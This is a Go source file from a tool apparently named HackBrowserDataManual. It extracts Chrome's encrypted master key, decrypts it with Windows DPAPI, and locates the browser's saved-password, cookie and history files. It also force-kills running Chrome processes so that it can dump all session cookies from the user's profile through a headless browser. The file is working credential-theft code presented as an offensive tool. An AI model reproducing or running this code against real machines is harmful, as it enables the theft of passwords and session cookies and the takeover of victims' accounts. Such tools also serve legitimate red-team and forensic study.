package browser

import (
	"HackBrowserDataManual/crypto"
	"HackBrowserDataManual/item"
	"HackBrowserDataManual/utils"
	"context"
	"encoding/base64"
	"fmt"
	"github.com/chromedp/cdproto/browser"
	"github.com/chromedp/cdproto/network"
	"github.com/chromedp/cdproto/storage"
	"github.com/chromedp/chromedp"
	"github.com/shirou/gopsutil/process"
	log "github.com/sirupsen/logrus"
	"github.com/tidwall/gjson"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"syscall"
)

type ChromeExistError struct {
}

func (e *ChromeExistError) Error() string {
	return "chrome process exist but not killed, cookie can only be parsed when there is no chrome process exists. Using --kill to force kill chrome process"
}

type IBrowserUtil interface {
	findBinaryPath() string
	getUserDir() string
}

type Browser struct {
	Action        string
	MasterKeyFile string
	InputFile     string
	UserDir       string
	name          string
	masterKey     []byte
	Util          IBrowserUtil
}

func (b *Browser) InitPath() {
	if b.MasterKeyFile == "" && b.Action != item.History {
		b.MasterKeyFile = b.Util.getUserDir() + item.ChromiumKey
	}
	b.MasterKeyFile = utils.NormalizePath(b.MasterKeyFile)
	log.Infof("Key file: %s", b.MasterKeyFile)
	if b.InputFile == "" {
		var fileName string
		switch b.Action {
		case item.Password:
			fileName = item.ChromiumPassword
		case item.Cookie:
			fileName = item.ChromiumCookie
		case item.History:
			fileName = item.ChromiumHistory
		default:
			log.Fatalf("invalid action %s", b.Action)
		}
		b.InputFile = b.Util.getUserDir() + item.DefaultProfile + fileName
	}
	b.InputFile = utils.NormalizePath(b.InputFile)
	log.Infof("Input file: %s", b.InputFile)
}

func (b *Browser) CheckBrowser(kill bool) (bool, error) {
	processes, err := process.Processes()
	if err != nil {
		return false, err
	}

	for _, p := range processes {
		parent, _ := p.Parent()
		if parent == nil {
			continue
		}
		// TODO check process belonging
		name, _ := p.Name()
		if name == filepath.Base(b.Util.findBinaryPath()) {
			log.Infof("Chrome found, pid %d", parent.Pid)
			if kill {
				if runtime.GOOS == "windows" {
					cmd := exec.Command("taskkill", []string{"/PID", strconv.Itoa(int(parent.Pid))}...)
					err = cmd.Run()
				} else {
					// only works on unix system
					err = parent.SendSignal(syscall.SIGINT)
				}
				if err != nil {
					return false, err
				}
				log.Infof("Chrome process killed")
				return true, nil
			}
			return false, &ChromeExistError{}
		}
	}
	log.Infof("No %s process found", b.GetName())
	return false, nil
}

func (b *Browser) RestoreBrowser() {
	browserName := b.Util.findBinaryPath()
	log.Infof("Restoring %s process", browserName)
	log.Infof("found binary at %s", browserName)
	cmd := exec.Command(browserName, " --restore-last-session")
	err := cmd.Start()
	if err != nil {
		log.Errorf("Restore %s failed: %s", browserName, err)
		return
	}
	log.Infof("Restore %s success", browserName)
	return
}

func (b *Browser) GetName() string {
	if b.name == "" {
		b.name = strings.TrimSuffix(filepath.Base(b.Util.findBinaryPath()), ".exe")
	}
	return b.name
}

func (b *Browser) GetAction() string {
	return b.Action
}

func (b *Browser) Read(target string) (string, error) {
	binaryPath := b.Util.findBinaryPath()
	opts := []chromedp.ExecAllocatorOption{chromedp.Flag("headless", true), chromedp.ExecPath(binaryPath)}
	ctx, cancel := chromedp.NewExecAllocator(context.Background(), opts...)
	defer cancel()
	ctx, cancel = chromedp.NewContext(ctx)
	defer cancel()

	var res string
	targetUrl := fmt.Sprintf("file://%s", target)
	log.Infof("Reading %s", targetUrl)
	err := chromedp.Run(ctx, chromedp.Navigate(targetUrl), chromedp.Evaluate("document.body.innerText", &res))
	if err != nil {
		return "", err
	}
	_ = chromedp.Cancel(ctx)
	return res, nil
}

// Download Chrome只将含有不可见字符的文件视为文件下载，content type为ostream什么的，全明文文件的content type是text
func (b *Browser) Download(target string) (string, error) {
	binaryPath := b.Util.findBinaryPath()
	opts := []chromedp.ExecAllocatorOption{chromedp.Flag("headless", true), chromedp.ExecPath(binaryPath)}
	ctx, cancel := chromedp.NewExecAllocator(context.Background(), opts...)
	defer cancel()
	ctx, cancel = chromedp.NewContext(ctx)
	defer cancel()

	done := make(chan string, 1)
	chromedp.ListenTarget(ctx, func(v interface{}) {
		if ev, ok := v.(*browser.EventDownloadProgress); ok {
			if ev.State == browser.DownloadProgressStateCompleted {
				done <- ev.GUID
				close(done)
			}
		}
	})

	// get working directory
	wd, err := os.Getwd()
	if err != nil {
		return "", err
	}
	targetUrl := fmt.Sprintf("file://%s", target)
	log.Infof("Navigate to %s", targetUrl)
	if err = chromedp.Run(ctx,
		browser.SetDownloadBehavior(browser.SetDownloadBehaviorBehaviorAllowAndName).
			WithDownloadPath(wd).
			WithEventsEnabled(true),
		chromedp.Navigate(targetUrl),
	); err != nil && !strings.Contains(err.Error(), "net::ERR_ABORTED") {
		// Note: Ignoring the net::ERR_ABORTED page error is essential here
		// since downloads will cause this error to be emitted, although the
		// download will still succeed.
		return "", err
	}

	guid := <-done
	log.Infof("wrote %s to %s", target, filepath.Join(wd, guid))
	_ = chromedp.Cancel(ctx)
	return guid, nil
}

func (b *Browser) GetKey() ([]byte, error) {
	masterKeyContent, err := b.Read(b.MasterKeyFile)
	if err != nil {
		return nil, err
	}
	b.masterKey, err = b.parseMasterKey(masterKeyContent)
	if err != nil {
		return nil, err
	}
	return b.masterKey, err

}

func (b *Browser) parseMasterKey(content string) ([]byte, error) {
	encryptedKey := gjson.Get(content, "os_crypt.encrypted_key")
	if !encryptedKey.Exists() {
		return nil, nil
	}

	key, err := base64.StdEncoding.DecodeString(encryptedKey.String())
	if err != nil {
		return nil, err
	}
	masterKey, err := crypto.DPAPI(key[5:])
	if err != nil {
		log.Error("initialized master key failed")
		return nil, err
	}
	log.Info("initialized master key success")
	return masterKey, err
}

func (b *Browser) ParseCookies() ([]*network.Cookie, error) {
	if b.UserDir == "" {
		b.UserDir = b.Util.getUserDir()
	}
	b.UserDir = filepath.ToSlash(filepath.Clean(b.UserDir))
	log.Infof("User home dir %s", b.UserDir)
	opts := []chromedp.ExecAllocatorOption{
		// 不设置用户数据目录的话浏览器会使用一个临时目录，约等于匿名模式启动
		chromedp.UserDataDir(b.UserDir),
		chromedp.Flag("headless", true),
	}

	ctx, cancel := chromedp.NewExecAllocator(context.Background(), opts...)
	defer cancel()

	ctx, cancel = chromedp.NewContext(ctx)
	defer cancel()

	var cookies []*network.Cookie
	err := chromedp.Run(ctx,
		chromedp.ActionFunc(func(ctx context.Context) error {
			var err error
			cookies, err = storage.GetCookies().Do(ctx)
			if err != nil {
				return err
			}
			return nil
		}),
	)
	if err != nil {
		return nil, err
	}

	// Close the browser gracefully to avoid corrupting the files in the user
	// data directory.
	err = chromedp.Cancel(ctx)
	if err != nil {
		log.Infof("chrome close failed: %s", err)
	}
	return cookies, nil
}
